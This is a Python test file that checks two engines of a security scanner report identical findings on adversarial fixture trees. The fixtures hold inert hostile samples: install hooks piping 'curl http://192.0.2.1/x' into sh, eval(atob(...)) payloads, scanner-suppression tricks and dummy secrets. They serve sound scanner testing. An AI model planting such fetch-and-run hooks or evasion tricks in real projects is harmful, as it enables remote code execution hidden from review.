"""The JavaScript engine (js/) and the Python engine must report the same
results for the same input. Runs both CLIs and compares:

* the issue MULTISETS keyed on (rule, file, line, severity, message) — a
  finding reported twice, at another severity or with other text is a
  difference;
* the report's metrics, counts, ratings, gate conditions and pass flag;
* the exit code.

Inputs: every fixture tree, a synthetic project covering earlier
false-positive fixes, and an ADVERSARIAL tree generated at test time (BOM /
UTF-16 / UTF-7-cookie sources, a UTF-8 file with a NUL near the top, .github/, node_modules/ scanned with and
without --deps, suppression tricks, a file with hundreds of findings, CRLF,
Unicode identifiers, a bidi control, .pyc files, symlinks and special files
where the OS supports them, files over the 2 MB limit). All fixture content
is inert: nothing is executed, hosts are TEST-NET (192.0.2.x) or .invalid,
credentials are dummies. Skipped where Node isn't installed.

Known, deliberate differences are listed in PYTHON_ONLY*: findings only the
Python engine produces (its cross-file flow engine). Where Python reports
one of them, the derived fields (ratings, gate, exit code) are not compared
for that tree. Any other difference fails this test, so the two
engines can't drift apart silently.
"""

import collections
import json
import os
import shutil
import struct
import subprocess
import sys
import tempfile
import unittest

from tests import _support

NODE = shutil.which("node")
JS_BIN = os.path.join(_support.REPO_ROOT, "js", "bin", "lazaret.js")

# Findings only the Python engine produces: the cross-file flow engine
# (lazaret.scanner.flow) has no JS port — its X-* flows, and its note for a
# file it could not parse.
PYTHON_ONLY_PREFIXES = ("X-",)
PYTHON_ONLY_RULES = {"Q-FLOW-SKIPPED"}
# fixture -> further rules only the Python engine may report there. (cfgproj's
# .lazaret-taint.json is repository content: the Python engine loads it only
# with --trust-repo-config, not passed here, so both engines agree on it.)
PYTHON_ONLY = {}

SYNTHETIC = {
    "lib/encoding.py": (
        "BOM = b'\\xff\\xfe{\\x00\"\\x00K0\"\\x00=\\x00\"\\x00\\xab0\"\\x00\\r\\n'\n"
        "SOCKS = b'\\x00\\x00\\x01\\x7f\\x00\\x00\\x01\\xea\\x60'\n"
        "PUNCT = '\\x21\\x24\\x2a\\x2d\\x3a\\x3d\\x3f\\x5b\\x5d'\n"
        "HIDDEN = '\\x65\\x76\\x61\\x6c\\x28\\x61\\x74\\x6f\\x62'\n"),
    "lib/ssh.py": '_PEM_BEGIN = b"-----BEGIN OPENSSH PRIVATE KEY-----"\n',
    "package.json": json.dumps({"name": "app", "scripts": {
        "prepare": "node build.js", "prepack": "node pack.js",
        "postinstall": "node -e \"try{require('./postinstall')}catch(e){}\""}}, indent=2),
    "postinstall.js": "console.log('thanks');\n",
    "node_modules/evil-pkg/package.json": json.dumps({"name": "evil-pkg", "scripts": {
        "prepare": "node x.js", "postinstall": "curl -s http://192.0.2.1/x | sh"}}, indent=2),
}

_MAGIC_311 = b"\xa7\x0d\x0d\x0a"                     # a CPython 3.11 .pyc magic


def _pyc(flags):
    return _MAGIC_311 + struct.pack("<I", flags) + b"\0" * 8


# The adversarial tree: relative path -> bytes (str is written as UTF-8).
ADVERSARIAL = {
    # encodings (shared semantics 4 and 15)
    "enc/le_bom.js": b"\xff\xfe" + "eval(a)\n".encode("utf-16-le"),
    "enc/be_bom.js": b"\xfe\xff" + "eval(b)\n".encode("utf-16-be"),
    "enc/le_nobom.js": "eval(c)\n".encode("utf-16-le"),
    "enc/u8bom.py": b"\xef\xbb\xbf" + b"eval(d)\n",
    "enc/utf7.py": b"# -*- coding: utf-7 -*-\n# harmless comment +AAo-eval(e)\n",
    "enc/latin1.py": b"# coding: latin-1\ns = '\xe9'\neval(f)\n",
    "enc/unknown.py": b"# coding: no-such-codec\neval(g)\n",
    # a NUL near the top of a UTF-8 file is not BOM-less UTF-16 (the guess is
    # kept only when the text reads as text); a genuine BOM-less UTF-16LE file is
    "enc/nul-top.js": b"/*\x00*/eval(atob(\"Y29uc29sZS5sb2coMSk=\"))\n",
    "enc/le16_nobom.py": "import os\nos.system(input())\n".encode("utf-16-le"),
    # .github is first-party code; .git is never scanned
    ".github/scripts/deploy.js": "eval(atob(payload))\n",
    ".git/hooks/pre-commit.js": "eval(hidden)\n",
    # dependency trees (compared with and without --deps)
    "node_modules/evil/package.json": json.dumps({"name": "evil", "scripts": {
        "postinstall": "curl -s http://192.0.2.1/x | sh", "prepare": "node p.js"}}, indent=2),
    "node_modules/evil/index.js": "const p = atob(s);\nconst q = 1;\neval(p);\ntry { f() } catch (e) {}\n",
    "node_modules/huge/dist/bundle.js": "var x = 1;\n" * 210000,     # > 2 MB
    "vendor/first_party.js": "eval(v)\n",                           # no markers: scanned
    "third/vendor/modules.txt": "# example.invalid/mod v1\n",       # Go vendor: pruned
    "third/vendor/x.js": "eval(q)\n",
    "venv/pyvenv.cfg": "home = /usr\n",
    "venv/lib/x.py": "eval(q)\n",
    # manifests (shared semantics 3)
    "package.json": "\ufeff" + json.dumps({"name": "app", "scripts": {
        "preprepare": "husky install", "postprepare": "curl http://192.0.2.1/x | sh",
        "postinstall": "node build.js"}}, indent=2),
    "sub/package.json": "{not json",                                # nested: not a finding
    "binding.gyp": "{'targets': [",                                 # root: SC-MANIFEST-UNPARSEABLE
    "native/binding.gyp": ("# gyp files are Python literals\n{\n  'targets': [{\n    'target_name': 'x',\n"
                    "    'libraries': ['<!(curl -s http://192.0.2.1/lib)'],\n"
                    "    'actions': [{'action_name': 'gen', 'action': ['sh', 'gen.sh']}],\n  }],\n}\n"),
    # suppression tricks (shared semantics 1 and 2)
    "sup/tricks.js": ("eval(atob(p)); // nosec\n"
                      "eval(y); const s = '// nosec';\n"
                      "-- nosec\neval(z)\n"
                      "eval(w); // lazaret-ignore: S-NEWFUNC, S-EVAL-JS\n"
                      "/**/eval(v)\n"
                      "// c\u2028eval(u)\n"
                      "const t = `\n// nosec\n`; eval(t)\n"),
    "sup/tricks.py": 'x = "# nosec"; eval(y)\ns = """\n# nosec\n"""\neval(z)\neval(w)  # nosec - reviewed\n',
    "sup/tricks.sql": "-- nosec\nGRANT ALL ON t TO PUBLIC;\nGRANT SELECT ON t TO PUBLIC;\n",
    "sup/crlf.py": b"eval(a)  # nosec\r\neval(b)\r\n# nosec\r\neval(c)\r\n",
    # hundreds of findings: capped low-value rules, never-capped security rules
    "many/many.js": ("// TODO x\n" * 500 + "console.log(a)\n" * 250 + "eval(a)\n" * 600
                     + 'Function(Buffer.from(p,"base64").toString())()\n'),
    "many/long.js": "x = 1; " * 700 + "eval(q);" + " y = 2;" * 700 + "\n",
    # Unicode (shared semantics 5 and 12)
    "uni/taint.py": ("caf\u00e9 = request.args['x']\nos.system(caf\u00e9)\n"
                     "x: str = request.args['q']\nos.system(x)\n\uff45val(n)\n"),
    "uni/taint.js": ("const na\u00efve = req.query.q;\nexec(na\u00efve);\n"
                     "const { a, b: c } = req.query;\nexec(c);\n\\u0065val(x)\neval\ufeff(y)\n"),
    "uni/bidi.js": "const ok = 1; // \u202e } \u2066\n",
    "uni/emoji.js": "const s = '" + "\U0001F600" * 150 + "';\n",
    # secrets (redacted identically)
    "sec/keys.py": ('token = "gho_' + "a1B2" * 9 + '"\n'
                    'api_key = "Zq8vN3pL0wX7rT2mK9sB"  # example_user\n'
                    'tok = "Zq8vN3pL0wX7rT2mK9sB4hF6"  # latest\n'
                    'u = "https://admin:s3cretPassw0rd@192.0.2.10/db"\neval(u)\n'),
    "sec/creds.sql": "create user bob identified by 'hunter2hunter2';\nGRANT ALL ON t TO PUBLIC;\n",
    "sec/markup.jsx": '<Input password="hunter2hunter2" />\n',
    # bytecode and binaries (shared semantics 8 and 9)
    "mod.py": "x = 1\n",
    "__pycache__/mod.cpython-311.pyc": _pyc(0),
    "__pycache__/gone.cpython-311.pyc": _pyc(1),
    "lib/native.so": b"\x7fELF\x02\x01\x01\x00" + b"\0" * 600,
    "data/blob.bin": b"\0" * 2_100_000,                              # > 2 MB, not a source
    "big/huge.js": "var y = 2;\n" * 210000,                          # > 2 MB source
    "dup/a.py": "".join(f"v{i} = compute({i})\n" for i in range(8)),
    "dup/b.py": "".join(f"v{i} = compute({i})\n" for i in range(8)),
}


def build_adversarial(root):
    """Write ADVERSARIAL under root, plus the entries the OS may not support
    (symlinks, a FIFO, a non-UTF-8 file name). Returns the skipped extras."""
    for rel, data in ADVERSARIAL.items():
        path = os.path.join(root, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as f:
            f.write(data if isinstance(data, bytes) else data.encode("utf-8"))
    skipped = []
    try:
        os.symlink(os.path.join(root, "mod.py"), os.path.join(root, "link.py"))
        os.symlink(root, os.path.join(root, "sup", "loop"), target_is_directory=True)
    except (OSError, NotImplementedError):
        skipped.append("symlinks")
    if hasattr(os, "mkfifo") and sys.platform != "win32":
        os.mkfifo(os.path.join(root, "pipe.js"))
    else:
        skipped.append("fifo")
    if sys.platform.startswith("linux"):
        with open(os.path.join(os.fsencode(root), b"bad\xff.js"), "wb") as f:
            f.write(b"eval(b)\n")
    else:
        skipped.append("non-UTF-8 file name")
    return skipped


CLI_TIMEOUT = 25          # seconds per CLI run; every tree here scans in a few


def run_cli(cmd, extra=(), out_dir=None):
    """-> (exit code, parsed JSON report or None, stderr); exit code None
    when the run timed out (e.g. an engine that blocks on a FIFO)."""
    with tempfile.TemporaryDirectory() as tmp:
        out = out_dir or tmp
        try:
            p = subprocess.run(list(cmd) + ["--out-dir", out, "--no-html", "--quiet", *extra],
                               capture_output=True, encoding="utf-8", errors="replace",
                               timeout=CLI_TIMEOUT)
        except subprocess.TimeoutExpired:
            return None, None, f"timed out after {CLI_TIMEOUT} s"
        path = os.path.join(out, "lazaret-report.json")
        report = None
        if os.path.exists(path):
            with open(path, encoding="utf-8") as f:
                report = json.load(f)
        return p.returncode, report, p.stderr


def js_cmd(root, deps=False):
    return [NODE, JS_BIN, "check", root] + (["--deps"] if deps else [])


def py_cmd(root, deps=False):
    return [sys.executable, "-m", "lazaret", root] + (["--deps"] if deps else [])


def both(root, deps=False, extra=()):
    return run_cli(js_cmd(root, deps), extra), run_cli(py_cmd(root, deps), extra)


def issue_key(issue):
    return (issue["rule"], str(issue["file"]).replace("\\", "/"), issue["line"], issue["sev"], issue["msg"])


def _python_only(issue, fixture=None):
    return (issue["rule"].startswith(PYTHON_ONLY_PREFIXES) or issue["rule"] in PYTHON_ONLY_RULES
            or issue["rule"] in PYTHON_ONLY.get(fixture, ()))


DERIVED = ("pass", "conditions", "counts", "ratings")


@unittest.skipUnless(NODE, "node is not installed")
class EngineParityTests(unittest.TestCase):
    maxDiff = None

    def assert_same(self, js, py, fixture=None, label=""):
        (js_exit, js_rep, js_err), (py_exit, py_rep, py_err) = js, py
        self.assertIsNotNone(js_rep, f"{label}: JS wrote no report (exit {js_exit}): {js_err[-500:]}")
        self.assertIsNotNone(py_rep, f"{label}: Python wrote no report (exit {py_exit}): {py_err[-500:]}")
        py_only = [i for i in py_rep["issues"] if _python_only(i, fixture)]
        js_c = collections.Counter(issue_key(i) for i in js_rep["issues"])
        py_c = collections.Counter(issue_key(i) for i in py_rep["issues"] if not _python_only(i, fixture))
        self.assertEqual(sorted((js_c - py_c).elements()), [], f"{label}: findings only the JS engine reports")
        self.assertEqual(sorted((py_c - js_c).elements()), [], f"{label}: findings only the Python engine reports")
        self.assertEqual(js_rep["metrics"], py_rep["metrics"], f"{label}: metrics")
        if not py_only:        # otherwise the Python-only findings legitimately move these
            for field in DERIVED:
                self.assertEqual(js_rep[field], py_rep[field], f"{label}: {field}")
            self.assertEqual(js_exit, py_exit, f"{label}: exit code")

    def test_fixture_trees(self):
        for name in sorted(os.listdir(_support.FIXTURES)):
            root = os.path.join(_support.FIXTURES, name)
            if not os.path.isdir(root):
                continue
            with self.subTest(fixture=name):
                self.assert_same(*both(root), fixture=name, label=name)

    def test_windows_line_endings_change_nothing(self):
        """Every fixture, converted to CRLF (as a Windows checkout does), must
        give exactly the findings its LF original gives, in both engines. CI
        on Windows first caught this: a bare "# nosec" on a CRLF line was
        ignored by the JS engine."""
        for name in sorted(os.listdir(_support.FIXTURES)):
            src = os.path.join(_support.FIXTURES, name)
            if not os.path.isdir(src):
                continue
            with self.subTest(fixture=name), tempfile.TemporaryDirectory() as tmp:
                lf, crlf = os.path.join(tmp, "lf"), os.path.join(tmp, "crlf")
                shutil.copytree(src, lf)
                shutil.copytree(src, crlf)
                for dirpath, _, files in os.walk(crlf):
                    for fname in files:
                        if fname.endswith((".py", ".js", ".sql", ".json")):
                            path = os.path.join(dirpath, fname)
                            with open(path, "rb") as f:
                                data = f.read().replace(b"\r\n", b"\n")
                            with open(path, "wb") as f:
                                f.write(data.replace(b"\n", b"\r\n"))
                for cmd in (js_cmd, py_cmd):
                    lf_exit, lf_rep, _ = run_cli(cmd(lf))
                    cr_exit, cr_rep, _ = run_cli(cmd(crlf))
                    self.assertEqual(collections.Counter(issue_key(i) for i in cr_rep["issues"]),
                                     collections.Counter(issue_key(i) for i in lf_rep["issues"]),
                                     f"{cmd.__name__}: CRLF changed the findings")
                    self.assertEqual(cr_exit, lf_exit)

    def test_false_positive_fixes_agree(self):
        with tempfile.TemporaryDirectory() as root:
            for rel, content in SYNTHETIC.items():
                path = os.path.join(root, rel)
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, "w", encoding="utf-8") as f:
                    f.write(content)
            js, py = both(root, deps=True)
            self.assert_same(js, py, label="synthetic")
            # and what both report is right, not merely identical:
            issues = js[1]["issues"]
            hex_lines = sorted(i["line"] for i in issues if i["rule"] == "SC-HEXSTR")
            self.assertEqual(hex_lines, [4], "only the hidden 'eval(atob' line")
            self.assertFalse(any(i["rule"] == "S-TOKEN" for i in issues), "PEM header constant")
            hooks = {(i["file"].replace("\\", "/"), i["line"], i["sev"]) for i in issues if i["rule"] == "SC-INSTALL-HOOK"}
            manifest = SYNTHETIC["package.json"].split("\n")
            dep = SYNTHETIC["node_modules/evil-pkg/package.json"].split("\n")
            self.assertEqual(hooks, {
                ("package.json", 1 + next(i for i, l in enumerate(manifest) if '"prepare"' in l), "INFO"),
                ("package.json", 1 + next(i for i, l in enumerate(manifest) if '"postinstall"' in l), "MAJOR"),
                ("node_modules/evil-pkg/package.json",
                 1 + next(i for i, l in enumerate(dep) if '"postinstall"' in l), "CRITICAL"),
            }, "prepare counts (INFO) in the project but not in a dependency; prepack never")

    def test_adversarial_tree_agrees(self):
        with tempfile.TemporaryDirectory() as root:
            skipped = build_adversarial(root)
            for label, deps, extra in (("default", False, ()), ("--deps", True, ()), ("--ci", False, ("--ci",))):
                js, py = both(root, deps=deps, extra=extra)
                if js[0] is None or py[0] is None:     # don't spend the time budget on more modes
                    self.fail(f"adversarial {label}: JS {js[2]!r}, Python {py[2]!r}"[:400])
                with self.subTest(mode=label, skipped=", ".join(skipped) or "none"):
                    self.assert_same(js, py, label=f"adversarial {label}")
                    rules = {i["rule"] for i in js[1]["issues"]}
                    # sanity: the tree exercises what it is meant to exercise
                    for rule in ("Q-ENCODING", "SC-UTF7", "SC-EVAL-DECODE", "Q-CAPPED", "S-BIDI",
                                 "SC-PYC-UNCHECKED", "SC-BINARY", "SC-TRUNCATED", "SC-MANIFEST-UNPARSEABLE"):
                        self.assertIn(rule, rules)
                    self.assertEqual("Q-SKIPPED-TREE" in rules, True)
                    found = {(i["rule"], i["file"]) for i in js[1]["issues"]}
                    self.assertIn(("SC-EVAL-DECODE", "enc/nul-top.js"), found)
                    self.assertNotIn(("Q-ENCODING", "enc/nul-top.js"), found)
                    self.assertIn(("Q-ENCODING", "enc/le16_nobom.py"), found)
                    self.assertIn(("S-OSCMD-PY", "enc/le16_nobom.py"), found)

    def test_manifest_depth_limit_agrees(self):
        """Both engines check a manifest's nesting (brackets outside strings)
        against the same limit, 500, before parsing it. The Python engine
        used to rely on json.loads' recursion limit (~995 levels on 3.10/3.11,
        ~10,000 on 3.12+), so a 700-deep package.json was SC-MANIFEST-DEPTH
        (and a forced exit 1) in the npm engine only."""
        def nested(depth):
            return '{"name": "x", "a": ' + "[" * (depth - 1) + "]" * (depth - 1) + "}"
        tree = {
            "package.json": nested(700),
            "ok/package.json": nested(500),
            "strings/package.json": json.dumps({"name": "s", "d": "[" * 1000}),
            "late/package.json": '{"a": x, "b": ' + "[" * 700 + "]" * 700 + "}",
            "native/binding.gyp": nested(700),
            "index.js": "module.exports = 1;\n",
        }
        with tempfile.TemporaryDirectory() as root:
            for rel, text in tree.items():
                path = os.path.join(root, *rel.split("/"))
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, "w", encoding="utf-8") as f:
                    f.write(text)
            js, py = both(root)
            self.assert_same(js, py, label="manifest depth")
            deep = sorted(i["file"] for i in py[1]["issues"] if i["rule"] == "SC-MANIFEST-DEPTH")
            self.assertEqual(deep, ["late/package.json", "native/binding.gyp", "package.json"])
            self.assertEqual((js[0], py[0]), (1, 1))

    def test_usage_and_forced_exit_codes_agree(self):
        with tempfile.TemporaryDirectory() as tmp:
            empty = os.path.join(tmp, "empty")
            os.mkdir(empty)
            afile = os.path.join(tmp, "a.py")
            with open(afile, "w", encoding="utf-8") as f:
                f.write("x = 1\n")
            deep = os.path.join(tmp, "deep")
            os.mkdir(deep)
            with open(os.path.join(deep, "package.json"), "w", encoding="utf-8") as f:
                # deeper than any interpreter parses (3.10/3.11 stop near 995
                # levels, 3.12+ near 10,000); both engines stop at 500
                f.write('{"a":' + "[" * 100_000 + "]" * 100_000 + "}")
            deep700 = os.path.join(tmp, "deep700")
            os.mkdir(deep700)
            with open(os.path.join(deep700, "package.json"), "w", encoding="utf-8") as f:
                f.write('{"a":' + "[" * 699 + "]" * 699 + "}")    # over the shared limit of 500
            foreign = os.path.join(tmp, "foreign")
            os.mkdir(foreign)
            with open(os.path.join(foreign, "a.py"), "w", encoding="utf-8") as f:
                f.write("x = 1\n")
            with open(os.path.join(foreign, "lazaret-report.json"), "w", encoding="utf-8") as f:
                f.write('{"precious": true}\n')
            cases = [
                ("empty directory", [empty], 2),
                ("missing directory", [os.path.join(tmp, "missing")], 2),
                ("a file, not a directory", [afile], 2),
                ("unknown option", [afile, "--no-such-option"], 2),
                ("hostile-depth manifest", [deep, "--no-html", "--out-dir", tmp], 1),
                ("700-deep manifest", [deep700, "--no-html", "--out-dir", tmp], 1),
                ("foreign file at the report path", [foreign, "--no-html"], 3),
            ]
            for label, args, want in cases:
                with self.subTest(case=label):
                    js = subprocess.run([NODE, JS_BIN, *args], capture_output=True, timeout=60)
                    py = subprocess.run([sys.executable, "-m", "lazaret", *args], capture_output=True, timeout=60)
                    self.assertEqual((js.returncode, py.returncode), (want, want))


if __name__ == "__main__":
    unittest.main()
